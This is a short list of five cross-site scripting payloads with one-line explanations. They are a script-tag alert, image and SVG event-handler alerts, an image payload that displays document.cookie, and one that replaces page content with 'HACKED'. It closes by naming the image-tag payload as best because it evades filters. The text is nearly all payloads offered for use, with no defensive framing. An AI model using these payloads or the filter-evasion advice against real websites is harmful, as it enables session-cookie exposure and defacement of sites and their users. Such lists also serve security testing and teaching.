1. <script>alert('XSS')</script>
This shows alert popup.

2. <img src=x onerror=alert('XSS')>
This runs script when image fails.

3. <svg/onload=alert('XSS')>
This runs script on SVG load.

4. <img src=x onerror=alert(document.cookie)>
This shows cookies.

5. <img src=x onerror="document.body.innerHTML='HACKED'">
This changes webpage content.

Best payload: Image tag, because it bypasses filters easily.